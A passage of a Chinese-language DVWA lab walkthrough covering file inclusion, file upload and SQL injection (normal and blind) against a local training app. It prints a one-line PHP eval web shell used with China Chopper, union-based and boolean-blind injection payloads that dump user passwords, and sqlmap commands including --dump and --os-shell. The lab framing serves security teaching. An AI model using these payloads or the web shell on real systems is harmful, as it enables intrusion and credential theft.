+<h2 id="3-4-File-Inclusion"><a href="#3-4-File-Inclusion" class="headerlink" title="3.4 File Inclusion"></a>3.4 File Inclusion</h2><h3 id="3-4-1-源码如下"><a href="#3-4-1-源码如下" class="headerlink" title="3.4.1 源码如下"></a>3.4.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-2-将page后面的参数修改为file1-php，可以获得file1-php中的内容"><a href="#3-4-2-将page后面的参数修改为file1-php，可以获得file1-php中的内容" class="headerlink" title="3.4.2 将page后面的参数修改为file1.php，可以获得file1.php中的内容"></a>3.4.2 将page后面的参数修改为file1.php，可以获得file1.php中的内容</h3><p><img src="https://img-blog.csdnimg.cn/20191028203744779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="file1.php"></p>
+<h3 id="3-4-3-将page后面的参数修改为file2-php，可以获得file2-php中的内容"><a href="#3-4-3-将page后面的参数修改为file2-php，可以获得file2-php中的内容" class="headerlink" title="3.4.3 将page后面的参数修改为file2.php，可以获得file2.php中的内容"></a>3.4.3 将page后面的参数修改为file2.php，可以获得file2.php中的内容</h3><p><img src="https://img-blog.csdnimg.cn/20191028203835811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="file2.php"></p>
+<h3 id="3-4-4-将page后面的参数修改为file3-php，可以获得file2-php中的内容"><a href="#3-4-4-将page后面的参数修改为file3-php，可以获得file2-php中的内容" class="headerlink" title="3.4.4 将page后面的参数修改为file3.php，可以获得file2.php中的内容"></a>3.4.4 将page后面的参数修改为file3.php，可以获得file2.php中的内容</h3><p><img src="https://img-blog.csdnimg.cn/20191028203946179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="file3.php"></p>
+<h3 id="3-4-5-将page后面的参数修改为-x2F-x2F-php-ini，可以获得php-ini中的内容"><a href="#3-4-5-将page后面的参数修改为-x2F-x2F-php-ini，可以获得php-ini中的内容" class="headerlink" title="3.4.5 将page后面的参数修改为..&#x2F;..&#x2F;php.ini，可以获得php.ini中的内容"></a>3.4.5 将page后面的参数修改为..&#x2F;..&#x2F;php.ini，可以获得php.ini中的内容</h3><p><img src="https://img-blog.csdnimg.cn/20191028204059300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="php.ini中的内容"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191028204123194.png" alt="php.ini内容查看"></p>
+<h3 id="3-4-6-将page后面的参数修改为-x2F-x2F-phpinfo-ini，可以获得phpinfo-ini中的内容"><a href="#3-4-6-将page后面的参数修改为-x2F-x2F-phpinfo-ini，可以获得phpinfo-ini中的内容" class="headerlink" title="3.4.6 将page后面的参数修改为..&#x2F;..&#x2F;phpinfo.ini，可以获得phpinfo.ini中的内容"></a>3.4.6 将page后面的参数修改为..&#x2F;..&#x2F;phpinfo.ini，可以获得phpinfo.ini中的内容</h3><p><img src="https://img-blog.csdnimg.cn/20191028204334437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="phpinfo.php中的内容"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191028204358156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="phpinfo.php内容查看"></p>
+<h2 id="3-5-File-Upload"><a href="#3-5-File-Upload" class="headerlink" title="3.5 File Upload"></a>3.5 File Upload</h2><h3 id="3-5-1-源码如下"><a href="#3-5-1-源码如下" class="headerlink" title="3.5.1 源码如下"></a>3.5.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;</span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder?</span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;</span><br><span class="line">        // No</span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Yes!</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-2-上传一句话木马来获取网站的部分或全部权限"><a href="#3-5-2-上传一句话木马来获取网站的部分或全部权限" class="headerlink" title="3.5.2 上传一句话木马来获取网站的部分或全部权限"></a>3.5.2 上传一句话木马来获取网站的部分或全部权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028204608698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传hack.php文件"></p>
+<h3 id="3-5-3-打开中国菜刀，右键添加，地址栏填入上传文件所在路径-参数名（一句话木马口令）为shell"><a href="#3-5-3-打开中国菜刀，右键添加，地址栏填入上传文件所在路径-参数名（一句话木马口令）为shell" class="headerlink" title="3.5.3 打开中国菜刀，右键添加，地址栏填入上传文件所在路径,参数名（一句话木马口令）为shell"></a>3.5.3 打开中国菜刀，右键添加，地址栏填入上传文件所在路径,参数名（一句话木马口令）为shell</h3><p><a target="_blank" rel="noopener" href="http://localhost/dvwa/hackable/uploads/hackWeb.php">http://localhost/dvwa/hackable/uploads/hackWeb.php</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20191028204707615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="中国菜刀"></p>
+<h3 id="3-5-4-然后菜刀就会通过向服务器发送包含shell参数的post请求，在服务器上执行任意命令，获取webshell权限，可以下载、修改服务器的所有文件。"><a href="#3-5-4-然后菜刀就会通过向服务器发送包含shell参数的post请求，在服务器上执行任意命令，获取webshell权限，可以下载、修改服务器的所有文件。" class="headerlink" title="3.5.4 然后菜刀就会通过向服务器发送包含shell参数的post请求，在服务器上执行任意命令，获取webshell权限，可以下载、修改服务器的所有文件。"></a>3.5.4 然后菜刀就会通过向服务器发送包含shell参数的post请求，在服务器上执行任意命令，获取webshell权限，可以下载、修改服务器的所有文件。</h3><p><img src="https://img-blog.csdnimg.cn/20191028204742481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="文件目录"></p>
+<h3 id="3-5-5-打开服务器的虚拟终端"><a href="#3-5-5-打开服务器的虚拟终端" class="headerlink" title="3.5.5 打开服务器的虚拟终端"></a>3.5.5 打开服务器的虚拟终端</h3><p><img src="https://img-blog.csdnimg.cn/20191028204827913.png" alt="虚拟终端"></p>
+<h2 id="3-6-SQL-Injection"><a href="#3-6-SQL-Injection" class="headerlink" title="3.6 SQL Injection"></a>3.6 SQL Injection</h2><h3 id="3-6-1-源码如下"><a href="#3-6-1-源码如下" class="headerlink" title="3.6.1 源码如下"></a>3.6.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_REQUEST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check database</span><br><span class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get results</span><br><span class="line">    while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        // Get values</span><br><span class="line">        $first = $row[&quot;first_name&quot;];</span><br><span class="line">        $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法一：直接输入命令注入"><a href="#方法一：直接输入命令注入" class="headerlink" title="方法一：直接输入命令注入"></a>方法一：直接输入命令注入</h3><h3 id="3-6-2-先随便输入一下常用ID，结果发现1、2、3、4、5均有回显值，输入错误的不回显"><a href="#3-6-2-先随便输入一下常用ID，结果发现1、2、3、4、5均有回显值，输入错误的不回显" class="headerlink" title="3.6.2 先随便输入一下常用ID，结果发现1、2、3、4、5均有回显值，输入错误的不回显"></a>3.6.2 先随便输入一下常用ID，结果发现1、2、3、4、5均有回显值，输入错误的不回显</h3><p><img src="https://img-blog.csdnimg.cn/20191028205008785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="输入1"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191028205031601.png" alt="输入5"></p>
+<h3 id="3-6-3-输入"><a href="#3-6-3-输入" class="headerlink" title="3.6.3 输入"></a>3.6.3 输入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27;or&#x27; 1 &#x27;=&#x27; 1</span><br></pre></td></tr></table></figure>
+
+<p>查看回显效果，遍历出了数据库中所有的内容</p>
+<p><img src="https://img-blog.csdnimg.cn/20191028205116787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="遍历数据库"></p>
+<h3 id="3-6-4-获取数据库版本、数据库名称，命令如下"><a href="#3-6-4-获取数据库版本、数据库名称，命令如下" class="headerlink" title="3.6.4 获取数据库版本、数据库名称，命令如下"></a>3.6.4 获取数据库版本、数据库名称，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028205211862.png" alt="数据库版本和数据库名"></p>
+<h3 id="3-6-5-获取数据库中的表，命令为如下"><a href="#3-6-5-获取数据库中的表，命令为如下" class="headerlink" title="3.6.5 获取数据库中的表，命令为如下"></a>3.6.5 获取数据库中的表，命令为如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028205256296.png" alt="数据库表"></p>
+<h3 id="3-6-6-获取获取表中的字段名，命令为如下"><a href="#3-6-6-获取获取表中的字段名，命令为如下" class="headerlink" title="3.6.6 获取获取表中的字段名，命令为如下"></a>3.6.6 获取获取表中的字段名，命令为如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028205401193.png" alt="字段名"></p>
+<h3 id="3-6-7-获得字段中的数据-命令如下"><a href="#3-6-7-获得字段中的数据-命令如下" class="headerlink" title="3.6.7 获得字段中的数据,命令如下"></a>3.6.7 获得字段中的数据,命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select user,password from users#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191028205746809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="字段中数据"></p>
+<h3 id="方法二：利用sqlmap注入"><a href="#方法二：利用sqlmap注入" class="headerlink" title="方法二：利用sqlmap注入"></a>方法二：利用sqlmap注入</h3><h3 id="3-6-8-首先查看网页是否存在漏洞和系统信息，命令如下"><a href="#3-6-8-首先查看网页是否存在漏洞和系统信息，命令如下" class="headerlink" title="3.6.8 首先查看网页是否存在漏洞和系统信息，命令如下"></a>3.6.8 首先查看网页是否存在漏洞和系统信息，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191101113047517.png" alt="检测注入点"></p>
+<p>发现了后台数据库为MySQL，Web服务器的操作系统是Linux Debian，Web应用技术是Apache 2.4.41, 脚本语言是PHP，后台数据库版本MySQL &gt;&#x3D; 5.0</p>
+<h3 id="3-6-9-然后从服务器中获得所有的数据库，命令如下"><a href="#3-6-9-然后从服务器中获得所有的数据库，命令如下" class="headerlink" title="3.6.9 然后从服务器中获得所有的数据库，命令如下"></a>3.6.9 然后从服务器中获得所有的数据库，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191101113340600.png" alt="获得所有数据库"></p>
+<p>发现了所有的数据库dvwa和information_schema</p>
+<h3 id="3-6-10-接着判断当前正在应用程序连接的哪个数据库，命令如下"><a href="#3-6-10-接着判断当前正在应用程序连接的哪个数据库，命令如下" class="headerlink" title="3.6.10 接着判断当前正在应用程序连接的哪个数据库，命令如下"></a>3.6.10 接着判断当前正在应用程序连接的哪个数据库，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191101114615173.png" alt="应用程序连接的数据库"></p>
+<p>发现应用程序连接dvwa这个数据库</p>
+<h3 id="3-6-11-下一步获得数据库中的表，命令如下"><a href="#3-6-11-下一步获得数据库中的表，命令如下" class="headerlink" title="3.6.11 下一步获得数据库中的表，命令如下"></a>3.6.11 下一步获得数据库中的表，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27; -D dvwa --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191101114805657.png" alt="数据库中的表"></p>
+<p>发现数据库中含有guestbook和users这两个表</p>
+<h3 id="3-6-12-最后，再获取users表中的字段，命令如下"><a href="#3-6-12-最后，再获取users表中的字段，命令如下" class="headerlink" title="3.6.12 最后，再获取users表中的字段，命令如下"></a>3.6.12 最后，再获取users表中的字段，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27; -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-13-最后，获取字段的信息，命令如下"><a href="#3-6-13-最后，获取字段的信息，命令如下" class="headerlink" title="3.6.13 最后，获取字段的信息，命令如下"></a>3.6.13 最后，获取字段的信息，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie &#x27;security=low;PHPSESSID=e5ei2qec43956rm0tjgea039pd&#x27; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191101115316765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="字段信息"></p>
+<h3 id="3-6-14-sqlmap命令详解"><a href="#3-6-14-sqlmap命令详解" class="headerlink" title="3.6.14 sqlmap命令详解"></a>3.6.14 sqlmap命令详解</h3><table>
+<thead>
+<tr>
+<th>命令行参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-u</td>
+<td>指定测试的URL地址（加单引号）</td>
+</tr>
+<tr>
+<td>–cookie</td>
+<td>指定cookie的值（加单引号）</td>
+</tr>
+<tr>
+<td>–dbs</td>
+<td>获取数据库信息</td>
+</tr>
+<tr>
+<td>–current-db</td>
+<td>获取当前应用程序连接的数据库</td>
+</tr>
+<tr>
+<td>-D</td>
+<td>指定数据库</td>
+</tr>
+<tr>
+<td>–tables</td>
+<td>获取数据库表的信息，一般结合-D参数获取指定数据库的表</td>
+</tr>
+<tr>
+<td>-T</td>
+<td>指定数据库表</td>
+</tr>
+<tr>
+<td>–columns</td>
+<td>获取表字段的信息，一般结合-T参数获取指定表的字段名</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>指定数据库表的列</td>
+</tr>
+<tr>
+<td>-dump</td>
+<td>转存数据库数据，可结合-D、-T、-C参数获取指定指定数据</td>
+</tr>
+<tr>
+<td>-privileges</td>
+<td>测试用户权限，–privileges -U -sa测试sa用户权限</td>
+</tr>
+<tr>
+<td>–os-cmd&#x3D;”net user”</td>
+<td>执行net user命令</td>
+</tr>
+<tr>
+<td>–os-shell</td>
+<td>获取系统交互shell</td>
+</tr>
+</tbody></table>
+<p><img src="https://img-blog.csdnimg.cn/20191101120555209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="sqlmap帮助1"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191101120641970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="sqlmap帮助2"></p>
+<h2 id="3-7-SQL-Injection-Blind"><a href="#3-7-SQL-Injection-Blind" class="headerlink" title="3.7 SQL Injection (Blind)"></a>3.7 SQL Injection (Blind)</h2><h3 id="3-7-1-源码如下"><a href="#3-7-1-源码如下" class="headerlink" title="3.7.1 源码如下"></a>3.7.1 源码如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_GET[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check database</span><br><span class="line">    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">    // Get results</span><br><span class="line">    $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors</span><br><span class="line">    if( $num &gt; 0 ) &#123;</span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // User wasn&#x27;t found, so the page wasn&#x27;t!</span><br><span class="line">        header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-7-2-从源码可知参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，查询结果只有"><a href="#3-7-2-从源码可知参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，查询结果只有" class="headerlink" title="3.7.2 从源码可知参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，查询结果只有"></a>3.7.2 从源码可知参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，查询结果只有</h3><p>“User ID exists in the database.” 和 “User ID is MISSING from the database.”<br>进而判断是否存在注入，是字符型还是数字型，输入1，查看回显结果。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191029015141158.png" alt="输入1"></p>
+<p>判断通过输入下面代码判断出是存在字符型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’ and 1 = 1#</span><br><span class="line">1’ and 1 = 2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015318272.png" alt="输入1=1"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191029015339924.png" alt="输入1=2"></p>
+<h3 id="3-7-3-判断数据库名的长度，最终判断出数据库名长度为4命令如下"><a href="#3-7-3-判断数据库名的长度，最终判断出数据库名长度为4命令如下" class="headerlink" title="3.7.3 判断数据库名的长度，最终判断出数据库名长度为4命令如下"></a>3.7.3 判断数据库名的长度，最终判断出数据库名长度为4命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015434797.png" alt="判断数据库长度不为1"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191029015500363.png" alt="判断数据库长度为4"></p>
+<h3 id="3-7-4-判断数据库的4个字母，命令如下"><a href="#3-7-4-判断数据库的4个字母，命令如下" class="headerlink" title="3.7.4 判断数据库的4个字母，命令如下"></a>3.7.4 判断数据库的4个字母，命令如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015544462.png" alt="数据库名首字母大于97"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;122#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015626622.png" alt="数据库名首字母小于122"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;110#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015710805.png" alt="数据库名首字母小于110"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;104#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015806793.png" alt="数据库名首字母小于104"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;100#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191029015855508.png" alt="数据库名首字母不小于100"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;100#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019102901594379.png" alt="数据库名首字母不大于100"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))=100#</span><br></pre></td></tr></table></figure>
+
